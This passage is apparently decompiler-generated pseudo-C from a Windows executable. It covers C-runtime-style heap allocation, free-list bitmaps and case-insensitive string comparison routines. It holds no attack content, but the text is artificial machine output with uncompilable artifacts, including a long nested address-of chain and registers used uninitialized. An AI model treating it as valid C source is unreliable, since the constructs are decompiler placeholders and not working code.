		esi_355 = dwLoc10_32;
		if ((eax_86->a00C4[0x00] & dwLoc0C_33 | (eax_86->a0044)[0x00] & dwLoc10_32) == 0x00)
		{
			do
			{
				ecx_349 = ecx_526 + 0x01;
				dwLoc08_347 = (word32) dwLoc08_347 + 0x01;
				ui32 * ecx_526 = ecx_349;
			} while ((*ecx_526 & dwLoc0C_33 | dwLoc10_32 & *ecx_349) == 0x00);
		}
		edx_363 = dwLoc08_347;
	}
	int32 edi_108 = 0x00;
	struct Eq_11394 * ecx_97 = eax_86 + (edx_363 *s 0x0204 + 0x0144) / 0x00C4;
	int32 ecx_100 = eax_86->a0044[edx_363] & esi_355;
	if (ecx_100 == 0x00)
	{
		ecx_100 = eax_86->a00C4[edx_363] & dwLoc0C_33;
		edi_108 = 0x20;
	}
	while (ecx_100 >= 0x00)
	{
		ecx_100 = ecx_100 << 0x01;
		edi_108 = edi_108 + 0x01;
	}
	struct Eq_11449 * edx_120 = ecx_97->a0004[edi_108].ptr0000;
	int32 ecx_122 = *edx_120 - ecx_25;
	int32 esi_127 = (ecx_122 >> 0x04) - 0x01;
	if (esi_127 > 0x3F)
		esi_127 = 0x3F;
	if (esi_127 == edi_108)
	{
l0040B7E0:
		if (ecx_122 != 0x00)
		{
			*edx_120 = ecx_122;
			edx_120[(ecx_122 - 0x04) / 0x0C] = (struct Eq_11449) ecx_122;
		}
		goto l0040B7EF;
	}
	if (edx_120->ptr0004 == edx_120->ptr0008)
	{
		if (edi_108 < 0x20)
		{
			uint32 ebx_290 = ~(0x80000000 >> (byte) edi_108);
			eax_86->a0044[dwLoc08_347] = ebx_290 & (eax_86->a0044)[dwLoc08_347];
			byte * edi_289 = (char *) &eax_86->t0000 + 0x04 + edi_108;
			byte v19_295 = *edi_289 - 0x01;
			*edi_289 = v19_295;
			if (v19_295 == 0x00)
			{
				*dwArg04_395 = *dwArg04_395 & ebx_290;
				ebx_142 = dwArg04_395;
				goto l0040B73C;
			}
l0040B739:
			ebx_142 = dwArg04_395;
			goto l0040B73C;
		}
		ui32 * ecx_311 = eax_86->a00C4 + dwLoc08_347;
		uint32 ebx_312 = ~(0x80000000 >> (byte) (edi_108 - 0x20));
		*ecx_311 = *ecx_311 & ebx_312;
		byte * edi_310 = (char *) &eax_86->t0000 + 0x04 + edi_108;
		byte v22_317 = *edi_310 - 0x01;
		*edi_310 = v22_317;
		if (v22_317 != 0x00)
			goto l0040B739;
		*((word32) dwArg04_395 + 0x04) = *((word32) dwArg04_395 + 0x04) & ebx_312;
		ebx_142 = dwArg04_395;
	}
l0040B73C:
	edx_120->ptr0008->ptr0004 = edx_120->ptr0004;
	edx_120->ptr0004->ptr0008 = edx_120->ptr0008;
	if (ecx_122 == 0x00)
	{
l0040B7EF:
		int32 * edx_145 = edx_120 + ecx_122 / 0x0C;
		*edx_145 = ecx_25 + 0x01;
		(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(edx_145 - 0x04)[ecx_25].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00] = ecx_25 + 0x01;
		word32 ecx_150 = ecx_97->dw0000;
		ecx_97->dw0000 = ecx_150 + 0x01;
		if (ecx_150 == 0x00 && (ebx_142 == globals->t492070 && dwLoc08_347 == globals->t492068))
			globals->t492070 = globals->t492070 & 0x00;
		eax_86->t0000 = dwLoc08_347;
		eax_162 = edx_145 + 0x01;
		return eax_162;
	}
	edx_120->ptr0004 = ecx_97->a0004[esi_127].ptr0000;
	struct Eq_11449 * ecx_205 = ecx_97 + esi_127 * 0x02;
	edx_120->ptr0008 = ecx_205;
	ecx_205->ptr0004 = edx_120;
	edx_120->ptr0004->ptr0008 = edx_120;
	if (edx_120->ptr0004 == edx_120->ptr0008)
	{
		byte cl_224 = eax_86[(esi_127 + 0x04) / 0x00C4];
		if (esi_127 < 0x20)
		{
			eax_86[(esi_127 + 0x04) / 0x00C4] = (struct Eq_11327) (cl_224 + 0x01);
			if (cl_224 == 0x00)
				*ebx_142 = *ebx_142 | 0x80000000 >> (byte) esi_127;
			eax_86->a0044[dwLoc08_347] = eax_86->a0044[dwLoc08_347] | 0x80000000 >> (byte) esi_127;
		}
		else
		{
			eax_86[(esi_127 + 0x04) / 0x00C4] = (struct Eq_11327) (cl_224 + 0x01);
			if (cl_224 == 0x00)
				*((word32) ebx_142 + 0x04) = *((word32) ebx_142 + 0x04) | 0x80000000 >> (byte) (esi_127 - 0x20);
			ui32 * edi_255 = eax_86->a00C4 + dwLoc08_347;
			*edi_255 = *edi_255 | 0x80000000 >> (byte) (esi_127 - 0x20);
		}
	}
	goto l0040B7E0;
}

// 0040B832: Register (ptr32 Eq_11780) fn0040B832()
Eq_11780 * fn0040B832()
{
	struct Eq_11780 * eax_22;
	ui32 eax_114 = globals->dw492074;
	ui32 ecx_4 = globals->dw492064;
	if (eax_114 == ecx_4)
	{
		Eq_5 eax_106 = HeapReAlloc(globals->t493084, 0x00, globals->t492078, ecx_4 + 0x50 + ecx_4 * 0x04 << 0x02);
		if (eax_106 == 0x00)
		{
l0040B8C5:
			eax_22 = null;
			return eax_22;
		}
		globals->dw492064 = globals->dw492064 + 0x10;
		globals->t492078 = eax_106;
		eax_114 = globals->dw492074;
	}
	struct Eq_11780 * esi_52 = (word32) globals->t492078 + eax_114 * 0x14;
	Eq_5 eax_53 = HeapAlloc(globals->t493084, 0x08, 0x41C4);
	esi_52->t0010 = eax_53;
	if (eax_53 != 0x00)
	{
		Eq_5 eax_66 = VirtualAlloc(0x00, 0x00100000, 0x2000, 0x04);
		esi_52->t000C = eax_66;
		if (eax_66 != 0x00)
		{
			esi_52->dw0008 = esi_52->dw0008 | ~0x00;
			esi_52->dw0000 = 0x00;
			esi_52->dw0004 = 0x00;
			globals->dw492074 = globals->dw492074 + 0x01;
			Eq_5 eax_88 = esi_52->t0010;
			*eax_88 = *eax_88 | ~0x00;
			eax_22 = esi_52;
			return eax_22;
		}
		HeapFree(globals->t493084, 0x00, esi_52->t0010);
	}
	goto l0040B8C5;
}

// 0040B8E3: Register int32 fn0040B8E3(Stack Eq_5 dwArg04)
int32 fn0040B8E3(Eq_5 dwArg04)
{
	struct Eq_11898 * esi_22 = *((word32) dwArg04 + 0x0010);
	int32 eax_23 = *((word32) dwArg04 + 0x08);
	int32 ebx_25 = 0x00;
	while (eax_23 >= 0x00)
	{
		eax_23 = eax_23 << 0x01;
		ebx_25 = ebx_25 + 0x01;
	}
	word32 edx_46 = 0x3F;
	struct Eq_11910 * eax_48 = esi_22 + (ebx_25 *s 0x0204 + 0x0144) / 0x00C4;
	eax_52 = eax_48;
	do
	{
		struct Eq_11910 * eax_52;
		eax_52[0x01] = (struct Eq_11910) eax_52;
		eax_52->dw0004 = eax_52;
		eax_52 = eax_52 + 0x01;
		edx_46 = edx_46 - 0x01;
	} while (edx_46 != 0x00);
	int32 eax_141;
	Eq_5 edi_65 = (word32) *((word32) dwArg04 + 0x0C) + (ebx_25 << 0x0F);
	Eq_5 eax_72 = VirtualAlloc(edi_65, 0x8000, 0x1000, 0x04);
	if (eax_72 == 0x00)
		eax_141 = eax_72 | ~0x00;
	else
	{
		if (edi_65 <=u edi_65 + 0x7000)
		{
			word32 eax_147 = edi_65 + 0x10;
			do
			{
				*(eax_147 - 0x08) = *(eax_147 - 0x08) | ~0x00;
				*((word32) eax_147 + 0x0FEC) = *((word32) eax_147 + 0x0FEC) | ~0x00;
				*(eax_147 - 0x04) = 0x0FF0;
				Mem158[eax_147 + 0x00:word32] = eax_147 + 0x0FFC;
				Mem160[eax_147 + 0x04:word32] = eax_147 + ~0x1003;
				*((word32) eax_147 + 0x0FE8) = 0x0FF0;
				eax_147 = eax_147 + 0x1000;
			} while (eax_147 - 0x10 <=u edi_65 + 0x7000);
		}
		Mem114[eax_48 + 0x01FC:word32] = edi_65 + 0x0C;
		*((word32) edi_65 + 0x0014) = eax_48 + 0x003F;
		Mem117[eax_48 + 0x0200:word32] = edi_65 + 0x700C;
		*((word32) edi_65 + 28688) = eax_48 + 0x003F;
		esi_22->a0044[ebx_25] = esi_22->a0044[ebx_25] & 0x00;
		esi_22->a00C4[ebx_25] = 0x01;
		byte al_123 = esi_22->b0043;
		esi_22->b0043 = al_123 + 0x01;
		if (al_123 == 0x00)
			*((word32) dwArg04 + 0x04) = *((word32) dwArg04 + 0x04) | 0x01;
		*((word32) dwArg04 + 0x08) = *((word32) dwArg04 + 0x08) & ~(0x80000000 >> (byte) ebx_25);
		eax_141 = ebx_25;
	}
	return eax_141;
}

// 0040B9DE: Register word32 fn0040B9DE(Stack Eq_5 dwArg04)
word32 fn0040B9DE(Eq_5 dwArg04)
{
	<anonymous> * eax_3 = globals->ptr492054;
	if (eax_3 == null)
		return 0x00;
	word32 * esp_27;
	word32 eax_28;
	byte SZO_29;
	bool C_30;
	bool Z_31;
	word32 ecx_32;
	eax_3();
	if (eax_28 == 0x00)
		return 0x00;
	*esp_27 = 0x01;
	return *esp_27;
}

// 0040BC76: Register word32 fn0040BC76(Stack word32 dwArg04)
word32 fn0040BC76(word32 dwArg04)
{
	return fn0040BC87((byte) dwArg04, 0x00, 0x04);
}

// 0040BC87: Register ui32 fn0040BC87(Stack byte bArg04, Stack ui32 dwArg08, Stack byte bArg0C)
ui32 fn0040BC87(byte bArg04, ui32 dwArg08, byte bArg0C)
{
	struct Eq_12105 * eax_3 = (word32) bArg04;
	if ((eax_3->b4932E1 & bArg0C) != 0x00)
		return 0x01;
	ui32 eax_29;
	if (dwArg08 != 0x00)
		eax_29 = (word32) globals->a4111BA[eax_3 * 0x02] & dwArg08;
	else
		eax_29 = 0x00;
	if (eax_29 != 0x00)
		return 0x01;
	return eax_29;
}

// 0040BCB8: void fn0040BCB8(Stack Eq_5 dwArg04, Stack Eq_5 dwArg08, Stack (ptr32 (arr Eq_5345)) dwArg0C)
void fn0040BCB8(Eq_5 dwArg04, Eq_5 dwArg08, Eq_5345 * dwArg0C[])
{
	if (globals->t492058 == 0x00)
	{
		Eq_5 eax_68 = LoadLibraryA(0x0040D60C);
		if (eax_68 == 0x00)
			return;
		Eq_5 eax_88 = GetProcAddress(eax_68, 0x0040D600);
		globals->t492058 = eax_88;
		if (eax_88 == 0x00)
			return;
		globals->t49205C = GetProcAddress(eax_68, 0x0040D5F0);
		globals->t492060 = GetProcAddress(eax_68, 0x0040D5DC);
	}
	Eq_5 eax_39 = globals->t49205C;
	if (eax_39 == 0x00)
	{
		word32 esp_57;
		word32 ebx_58;
		byte SZO_59;
		bool C_60;
		byte SCZO_61;
		word32 esi_62;
		word32 edi_63;
		bool Z_64;
		word32 eax_65;
		globals->t492058();
	}
}

// 0040C490: Register Eq_5 fn0040C490(Register byte dl, Register byte bl, Stack Eq_5 dwArg04, Stack (ptr32 byte) dwArg08, Stack Eq_5 dwArg0C, Register out Eq_431 dlOut, Register out Eq_432 blOut)
Eq_5 fn0040C490(byte dl, byte bl, Eq_5 dwArg04, byte * dwArg08, Eq_5 dwArg0C, Eq_431 & dlOut, Eq_432 & blOut)
{
	*dlOut = dl;
	Eq_5 ecx_100 = dwArg0C;
	if (dwArg0C != 0x00)
	{
		Eq_5 esi_119 = dwArg04;
		byte * edi_120 = dwArg08;
		if (globals->t491ED4 == 0x00)
		{
			Eq_5 ecx_135 = dwArg0C;
			do
			{
				bool C_110;
				cu8 ah_82 = *esi_119;
				cu8 ah_104 = ah_82;
				cu8 al_105 = *edi_120;
				if (ah_82 == 0x00 || al_105 == 0x00)
					break;
				esi_119 = (word32) esi_119 + 0x01;
				edi_120 = edi_120 + 0x01;
				if (ah_82 >= 0x41 && ah_82 <= 0x5A)
					ah_104 = ah_82 + 0x20;
				if (al_105 >= 0x41 && al_105 <= 0x5A)
					al_105 = al_105 + 0x20;
				C_110 = (bool) cond(ah_104 - al_105);
				if (ah_104 != al_105)
					goto l0040C4EB;
				ecx_135 = ecx_135 - 0x01;
			} while (ecx_135 != 0x00);
			ecx_100.u0 = 0x00;
			C_110 = (bool) cond(ah_104 - al_105);
			if (ah_104 != al_105)
			{
l0040C4EB:
				ecx_100.u0 = ~0x00;
				if (!C_110)
					ecx_100 = -~0x00;
			}
		}
		else
		{
			Eq_5469 eax_148 = 0x00;
			Eq_5469 ebx_149 = 0x00;
			byte * edi_152 = dwArg08;
			do
			{
				bool C_193;
				Eq_5469 eax_171 = DPB(eax_148, *esi_119, 0);
				eax_148 = eax_171;
				ebx_149 = DPB(ebx_149, *edi_152, 0);
				if (eax_171 == 0x00 || ebx_149 == 0x00)
					break;
				Eq_5 ecx_248;
				byte dl_249;
				Eq_5469 eax_250 = fn004076EE(ecx_100, ebx_149, SLICE(ebx_149, byte, 8), SLICE(ebx_149, byte, 16), out ecx_248, out dl_249);
				word32 ecx_256;
				byte dl_257;
				eax_148 = fn004076EE(ecx_248, eax_171, SLICE(eax_171, byte, 8), SLICE(eax_171, byte, 16), out ecx_256, out dl_257);
				esi_119 = (word32) esi_119 + 0x01;
				edi_152 = edi_152 + 0x01;
				ebx_149 = eax_250;
				C_193 = (bool) cond(eax_148 - eax_250);
				if (eax_148 != eax_250)
					goto l0040C52D;
				ecx_100 = ecx_100 - 0x01;
			} while (ecx_100 != 0x00);
			ecx_100.u0 = 0x00;
			C_193 = (bool) cond(eax_148 - ebx_149);
			if (eax_148 != ebx_149)
			{
l0040C52D:
				ecx_100.u0 = ~0x00;
				if (!C_193)
					ecx_100 = -~0x00;
			}
		}
	}
	byte bl_53;
	*blOut = (byte) ebx;
	return ecx_100;
}

// 0040C540: Register int32 fn0040C540(Register Eq_5 ecx, Stack Eq_5 dwArg04, Stack Eq_5 dwArg08)
int32 fn0040C540(Eq_5 ecx, Eq_5 dwArg04, Eq_5 dwArg08)
{
	int32 eax_143;
	Eq_5 esi_139 = dwArg08;
	if (globals->t491ED4 == 0x00)
	{
		cu8 al_108 = ~0x00;
		Eq_5 edi_50 = dwArg04;
		do
		{
			cu8 al_117 = al_108;
			if (al_108 == 0x00)
				goto l0040C58E;
			al_108 = (cu8) *esi_139;
			esi_139 = (word32) esi_139 + 0x01;
			cu8 ah_87 = *edi_50;
			edi_50 = (word32) edi_50 + 0x01;
			if (ah_87 == al_108)
				continue;
			cu8 al_107 = ah_87 - 0x41 + (0x00 - (ah_87 < 0x5B) & 0x20);
			cu8 al_97 = al_108 - 0x41 + (0x00 - (al_108 < 0x5B) & 0x20);
			al_108 = al_107 + 0x41;
		} while (al_107 + 0x41 == al_97 + 0x41);
		cu8 al_114 = 0x00 - (al_107 + 0x41 < al_97 + 0x41);
		al_117 = al_114 - ~0x00 - (al_114 < 0x00);
l0040C58E:
		eax_143 = (int32) al_117;
	}
	else
	{
		Eq_5469 eax_120 = 0xFF;
		cu8 al_121 = ~0x00;
		Eq_5469 ebx_122 = 0x00;
		Eq_5 edi_125 = dwArg04;
		do
		{
			eax_143 = (int32) DPB(eax_120, al_121, 0);
			if (al_121 == 0x00)
				return eax_143;
			al_121 = (cu8) *esi_139;
			cu8 bl_150 = *edi_125;
			eax_120 = DPB(eax_120, al_121, 0);
			esi_139 = (word32) esi_139 + 0x01;
			ebx_122 = DPB(ebx_122, bl_150, 0);
			edi_125 = (word32) edi_125 + 0x01;
			if (al_121 == bl_150)
				continue;
			Eq_5 ecx_163;
			byte dl_164;
			Eq_5469 eax_165 = fn004076EE(ecx, ebx_122, SLICE(ebx_122, byte, 8), SLICE(ebx_122, byte, 16), out ecx_163, out dl_164);
			byte dl_171;
			eax_120 = fn004076EE(ecx_163, eax_120, SLICE(eax_120, byte, 8), SLICE(eax_120, byte, 16), out ecx, out dl_171);
			ebx_122 = eax_165;
			cu8 bl_167 = (byte) eax_165;
			al_121 = (byte) eax_120;
		} while (bl_167 == al_121);
		up32 eax_179 = 0x00 - (bl_167 < al_121);
		eax_143 = eax_179 - ~0x00 - (eax_179 < 0x00);
	}
	return eax_143;
}

// 0040C5CC: void fn0040C5CC(Register ptr32 ebp, Stack Eq_5 dwArg04)
void fn0040C5CC(ptr32 ebp, Eq_5 dwArg04)
{
	Eq_5481 eax_10 = globals->t491ED4;
	Eq_5 dwLoc08_122 = 0x00;
	if (eax_10 == 0x00)
	{
		Eq_5 edx_51 = dwArg04;
		if (*dwArg04 != 0x00)
		{
			do
			{
				ci8 cl_77 = *edx_51;
				if (cl_77 >= 0x41 && cl_77 <= 0x5A)
					*edx_51 = cl_77 + 0x20;
				edx_51 = (word32) edx_51 + 0x01;
			} while (*edx_51 != 0x00);
		}
	}
	else
	{
		word32 ecx_115;
		byte dl_116;
		Eq_5 eax_117 = fn00408621(fp - 0x04, eax_10, 0x0100, 0x01, dwArg04, ~0x00, 0x00, 0x00, 0x00, 0x01, out ecx_115, out dl_116);
		if (eax_117 != 0x00)
		{
			Eq_5 eax_155 = fn00409233(eax_117);
			dwLoc08_122 = eax_155;
			if (eax_155 != 0x00)
			{
				word32 ecx_180;
				byte dl_181;
				if (fn00408621(fp - 0x04, globals->t491ED4, 0x0100, 0x01, dwArg04, ~0x00, eax_155, eax_117, 0x00, 0x01, out ecx_180, out dl_181) != 0x00)
				{
					word32 edi_193;
					fn00407370(dwArg04, out edi_193);
				}
			}
		}
		*(fp - 0x18) = (union Eq_5 *) dwLoc08_122;
		word32 ebp_142;
		word32 edi_143;
		fn00409204(fp - 0x04, dwArg00, out ebp_142, out edi_143);
	}
}

